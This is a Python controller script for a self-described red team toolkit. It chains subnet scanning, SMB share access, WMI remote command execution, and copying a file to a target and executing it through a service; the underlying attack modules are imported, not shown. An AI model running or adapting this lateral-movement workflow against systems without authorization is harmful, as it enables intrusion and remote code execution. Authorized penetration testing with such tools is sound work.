#!/usr/bin/env python3
"""
Main Controller - Network Red Team Toolkit
"""

from smb_lateral import SMBLateralMovement
from wmi_remote import WMIRemoteExecution
from network_scanner import NetworkScanner
import time
import json

class RedTeamController:
    def __init__(self):
        self.scanner = NetworkScanner()
        self.smb = SMBLateralMovement()
        self.wmi = WMIRemoteExecution()
        self.results = {}
    
    def banner(self):
        print("NETWORK RED TEAM TOOLKIT")
        print("=" * 50)
        print("FOR AUTHORIZED SECURITY TESTING ONLY")
        print("=" * 50)
        print()
    
    def phase_1_discovery(self, subnet="192.168.1.0/24"):
        print("[PHASE 1] NETWORK DISCOVERY")
        print("-" * 30)
        
        scan_results = self.scanner.comprehensive_scan(subnet)
        self.results['discovery'] = scan_results
        
        print(f"Discovery phase completed")
        print(f"Found {len(scan_results)} active hosts")
        
        return scan_results
    
    def phase_2_lateral_movement(self, target_ip):
        print(f"[PHASE 2] LATERAL MOVEMENT - {target_ip}")
        print("-" * 40)
        
        movement_results = {}
        
        print("Discovering SMB shares...")
        shares = self.smb.discover_shares(target_ip)
        movement_results['shares'] = shares
        
        if shares:
            print(f"Found {len(shares)} shares: {shares}")
            
            for share in shares[:2]:
                access = self.smb.check_share_access(target_ip, share)
                movement_results[f'access_{share}'] = access
        
        print("Testing WMI connectivity...")
        wmi_accessible = self.wmi.test_wmi_connectivity(target_ip)
        movement_results['wmi_accessible'] = wmi_accessible
        
        if wmi_accessible:
            print("WMI is accessible")
            
            print("Attempting command execution via WMI...")
            cmd_result = self.wmi.remote_code_execution(target_ip, "whoami")
            movement_results['wmi_command'] = cmd_result
            
            if cmd_result.get('success'):
                print("Command execution successful!")
            else:
                print("Command execution failed")
        
        self.results['lateral_movement'] = movement_results
        return movement_results
    
    def phase_3_deployment(self, target_ip):
        print(f"[PHASE 3] PAYLOAD DEPLOYMENT - {target_ip}")
        print("-" * 40)
        
        deployment_results = {}
        
        test_payload = "test_payload.txt"
        with open(test_payload, 'w') as f:
            f.write("This is a test payload for red team testing\n")
            f.write("If you can read this, file copy was successful\n")
        
        print(f"Created test payload: {test_payload}")
        
        shares = self.smb.discover_shares(target_ip)
        
        if shares:
            print(f"Attempting to deploy payload to {target_ip}...")
            copy_result = self.smb.copy_file_via_smb(test_payload, target_ip, shares[0])
            deployment_results['file_copy'] = copy_result
            
            print(f"Attempting service-based execution...")
            service_result = self.smb.execute_via_service(target_ip, shares[0], test_payload)
            deployment_results['service_execution'] = service_result
        
        self.results['deployment'] = deployment_results
        return deployment_results
    
    def generate_report(self):
        print("=" * 50)
        print("ENGAGEMENT REPORT")
        print("=" * 50)
        
        report = {
            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
            'results': self.results
        }
        
        with open('red_team_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        print("Report saved to: red_team_report.json")
        
        if 'discovery' in self.results:
            hosts = len(self.results['discovery'])
            print(f"Hosts Discovered: {hosts}")
        
        if 'lateral_movement' in self.results:
            lm = self.results['lateral_movement']
            shares = len(lm.get('shares', []))
            wmi = lm.get('wmi_accessible', False)
            print(f"Lateral Movement: {shares} shares, WMI: {wmi}")
    
    def run_engagement(self, subnet="192.168.1.0/24"):
        self.banner()
        
        try:
            discovery_results = self.phase_1_discovery(subnet)
            
            if discovery_results:
                target_host = list(discovery_results.keys())[0]
                print(f"Selected target for testing: {target_host}")
                
                self.phase_2_lateral_movement(target_host)
                self.phase_3_deployment(target_host)
            
            self.generate_report()
            
            print("ENGAGEMENT COMPLETED")
            print("Remember: This is for authorized testing only!")
            
        except Exception as e:
            print(f"Engagement failed: {e}")
            print("Check your network configuration and permissions")

def main():
    controller = RedTeamController()
    
    subnet = "192.168.1.0/24"
    
    print(f"Starting engagement on subnet: {subnet}")
    print("Press Ctrl+C to stop")
    
    try:
        controller.run_engagement(subnet)
    except KeyboardInterrupt:
        print("Engagement stopped by user")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
